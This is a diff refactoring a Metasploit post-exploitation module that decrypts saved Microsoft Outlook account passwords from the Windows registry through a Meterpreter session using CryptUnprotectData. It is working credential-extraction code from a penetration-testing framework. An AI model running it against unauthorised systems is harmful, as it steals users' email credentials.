@@ -5,39 +5,53 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Post::Windows::Priv
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name' => 'Windows Gather Microsoft Outlook Saved Password Extraction',
-      'Description' => %q{
-        This module extracts and decrypts saved Microsoft
-        Outlook (versions 2002-2010) passwords from the Windows
-        Registry for POP3/IMAP/SMTP/HTTP accounts.
-        In order for decryption to be successful, this module must be
-        executed under the same privileges as the user which originally
-        encrypted the password.
-      },
-      'License' => MSF_LICENSE,
-      'Author' => [ 'Justin Cacak' ], # Updated to work with newer versions of Outlook (2013, 2016, Office 365)
-      'Platform' => [ 'win' ],
-      'SessionTypes' => [ 'meterpreter' ])
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather Microsoft Outlook Saved Password Extraction',
+        'Description' => %q{
+          This module extracts and decrypts saved Microsoft
+          Outlook (versions 2002-2010) passwords from the Windows
+          Registry for POP3/IMAP/SMTP/HTTP accounts.
+          In order for decryption to be successful, this module must be
+          executed under the same privileges as the user which originally
+          encrypted the password.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'Justin Cacak' ], # Updated to work with newer versions of Outlook (2013, 2016, Office 365)
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter' ],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              stdapi_railgun_api
+              stdapi_sys_config_getuid
+              stdapi_sys_process_attach
+              stdapi_sys_process_get_processes
+              stdapi_sys_process_getpid
+              stdapi_sys_process_memory_allocate
+              stdapi_sys_process_memory_read
+              stdapi_sys_process_memory_write
+            ]
+          }
+        }
+      )
     )
   end
 
   def prepare_railgun
-    rg = session.railgun
-    if !rg.get_dll('crypt32')
-      rg.add_dll('crypt32')
+    if !session.railgun.get_dll('crypt32')
+      session.railgun.add_dll('crypt32')
     end
   end
 
   def decrypt_password(data)
-    rg = session.railgun
     pid = client.sys.process.getpid
     process = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
 
@@ -47,12 +61,12 @@ class MetasploitModule < Msf::Post
     if session.sys.process.each_process.find { |i| i["pid"] == pid } ["arch"] == "x86"
       addr = [mem].pack("V")
       len = [data.length].pack("V")
-      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
+      ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
       len, addr = ret["pDataOut"].unpack("V2")
     else
       addr = [mem].pack("Q")
       len = [data.length].pack("Q")
-      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
+      ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
       len, addr = ret["pDataOut"].unpack("Q2")
     end
 
@@ -369,7 +383,6 @@ class MetasploitModule < Msf::Post
     elsif saved_accounts == 0
       print_status("Microsoft Outlook installed however no accounts stored in Registry.")
     end
-
   end
 
   def outlook_version
@@ -381,7 +394,6 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-
     # Get Outlook version from registry
     outlook_ver = outlook_version
     fail_with(Failure::NotFound, "Microsoft Outlook version not found in registry.") if outlook_ver.nil?
